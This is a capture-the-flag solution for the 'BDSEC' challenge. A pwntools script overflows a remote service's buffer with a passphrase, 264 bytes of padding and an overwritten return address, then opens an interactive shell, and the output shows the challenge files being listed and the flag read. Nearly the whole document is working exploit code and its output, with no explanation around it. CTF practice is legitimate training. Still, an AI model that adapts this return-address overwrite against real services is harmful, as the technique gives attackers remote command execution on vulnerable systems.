```py
from pwn import *
from struct import pack

host,port = "159.223.101.241",31337

padding = 264

payload = b"hAcK_Th3_Pl@n3t\x00"
payload += b"A" * (padding - len(payload))
payload += pack("<Q", 0x004013a8)

io = remote(host,port)
io.sendline(payload)
io.interactive()
```
```bash
$ python solver.py
$ ls
Makefile
flag
pwnrace
ynetd
ynetd.c
$ cat flag
BDSEC{pwn_is_the_way_to_haven}
```
![pwn1.png]
